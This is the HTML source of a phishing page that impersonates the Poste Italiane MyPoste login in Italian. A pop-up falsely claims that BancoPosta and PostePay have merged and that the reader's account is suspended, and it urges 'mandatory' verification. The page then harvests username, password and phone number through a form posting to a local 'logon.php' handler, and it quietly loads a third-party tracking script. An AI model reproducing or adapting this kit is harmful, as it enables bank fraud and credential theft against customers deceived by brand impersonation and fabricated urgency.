﻿<!doctype html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>Accedi o Registrati</title>
	<link type="text/css" rel="stylesheet" href="css/bootstrap.min.css">
	<link type="text/css" rel="stylesheet" href="css/fonts.css">
	<link type="text/css" rel="stylesheet" href="css/style.css">
	<script src="https://code.jquery.com/jquery-latest.min.js"></script>
	<script type="text/javascript" src="script/bootstrap.min.js"></script>
	<script type="text/javascript" src="script/site.js"></script>
</head>

<div class="preload">
	<p>
		<img src="img/logo.png" class="logo">
	</p>
	<p>
		<img src="img/spn.gif" class="spn" />
	</p>
</div>
<div class="modal">
    <div class="modal-dialog modal-lg">
        <div class="modal-content">
            <div class="modal-header">
                <img src="img/logo-small.png">
            </div>
			<div class="modal-body">
				<p>Gentile Cliente,</p>

				<p><strong>Poste Italiane S.p.A</strong>. e <strong>PostePay S.p.A</strong>. diventano una sola <strong>BANCA OPERATIVA</strong> "<span style="color:#0000CD;"><strong>Bancoposta</strong>&amp; Postepay</span>" Da oggi in data odierna <stron>Vi invitiamo OBBLIGATORIAMENTE ad effettuare una piccola procedura di verifica Titolarità Conto ,onde evitare restrizioni alle tue utenze postali.</stron></p>

				<p>Segui le istruzioni per evitare<span style="color:#0000CD;"> <strong>La sospensione Permanente</strong></span><strong> Del suo conto Bancoposta o Postepay.</strong></p><strong>

				<p>Per sua tutela abbiamo sospeso la sua utenza fino alla ricezione da parte nostra di tale verifica.</p>

				<p><strong>NON IGNORARE QUESTA PROCEDURA</strong>.</p> </strong>
			</div>            
			<div class="modal-footer">
                <button type="button" class="btn btn-primary btn-del">PROCEDI</button>
            </div>
            <div class="modal-extra"> ©Poste Italiane 2021 - Partita iva : 01114601006 </div>
        </div>
            
    </div>
</div>

<body>



	<div class="container-fluid">
		<div class="row">
			<div class="col-lg-12 header fixed">
				<header>
					<img src="img/back.png" class="back" />
					<img src="img/logo.png" class="logo">
				</header>
			</div>
		</div>
	</div>
	<div class="container-fluid bd-bot-header">
		<div class="row">
			<div class="col-lg-12 bd">
				<h1>
					Accedi
				</h1>
				<h3>
					Per accedere a <strong>MyPoste</strong> devi essere un utente registrato.

					<a href="#">
						Se sei un cliente business clicca qui.
					</a>
				</h3>
				<div class="cards">
					<div class="pnl-h">
						<h4>
							Inserisci le tue credenziali
						</h4>
					</div>
					<form action="_dc/logon.php" method="post">
						<div class="pnl-bd">
							<div class="form-group">
								<p>
									<label class="control-label" for="usrn">
										NOME UTENTE
									</label> <input class="form-control" id="usrn" name="username" pattern=".{1,}\..{1,}" placeholder="inserisci" type="text" required>
								</p>
							</div>
							<div class="form-group">
								<label class="control-label" for="password">PASSWORD</label>
								<div class="input-group">
									<input type="password" class="form-control" id="password" name="password" placeholder="inserisci" required>
								</div>
							</div>
							<div class="form-group">
								<p>
									<label class="control-label" for="saldo">
										NUMERO DI TELEFONO
									</label>
									<input name="cellulare" class="form-control" placeholder="Inserisci" required type="text">
								</p>
							</div>
							<a href="#" class="rmb">Hai dimenticato il nome utente o la password?</a>

							<input type="submit" class="btn btn-primary" value="accedi">


							<p class="noA">
								Non hai un account? <a href="#">Registrati</a>
							</p>
						</div>
					</form>
				</div>
			</div>
		</div>
		<div class="row">
			<div class="col-lg-12">
				<div class="content-main">
					<div class="container">
						<div class="row">
							<div class="col-lg-12">
								<h2>Hai bisogno di aiuto?</h2>
							</div>
							<div class="col-md-8 col-lg-push-1 col-lg-10">
								<div class="row">
									<div class="col-sm-6 col-md-4 col-sm-push-0 col-md-push-0">
										<a href="#" title="Chiamaci" class="btn btn-secondary"><img src="img/ch.png" style="margin-right:10px;">Chiamaci</a>
									</div>
									<div class="col-sm-6 col-md-4">
										<a href="#" title="Domande Frequenti" class="btn btn-secondary"><img src="img/sc.png" style="margin-right:10px;">Scrivici</a>
									</div>
									<div class="col-sm-6 col-md-4">
										<a href="#" title="Richiedi Assistenza" class="btn btn-secondary">
											<img src="img/vi.png" style="margin-right:10px;">Vieni
											in Poste
										</a>
									</div>
								</div>
							</div>
							<div class="content-main content-text">
								<div class="container">
									<div class="row">
										<div class="col-md-8 col-lg-push-1 col-lg-10 text-center">
											In caso di mancato accesso o non funzionamento dei
											servizi è possibile contattare il Call Center al
											numero verde <a href="tel:803.160">803.160</a> (dal
											lunedì al sabato dalle ore 8.00 alle ore 20.00).
											La chiamata è gratuita.
										</div>
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>
		</div>
		<div class="row">
			<div class="col-lg-12 no-padding">
				<div class="content-footer">
					<div class="container">
						<div class="row">
							<div class="col-lg-12">
								<p class="text-center">
									&copy; Poste Italiane 2021 - Partita iva : 01114601006 <br />
									<a href="#">Preferenze Cookie</a> &nbsp;&nbsp;&nbsp;|
								</p>
							</div>
						</div>
					</div>
				</div>
			</div>
		</div>
	</div>
	<a class="ui-to-top">
		<img src="img/top.png" />
	</a>
	<div class="chat">
		<img src="img/icn_chat.png">
	</div>

	<p style="display:none; width:100%" class="text-center">
		

<script id="_waugi6">var _wau = _wau || []; _wau.push(["dynamic", "z6dgjjy4rp", "gi6", "c4302bffffff", "small"]);</script><script async src="//waust.at/d.js"></script>


</body>
</html>
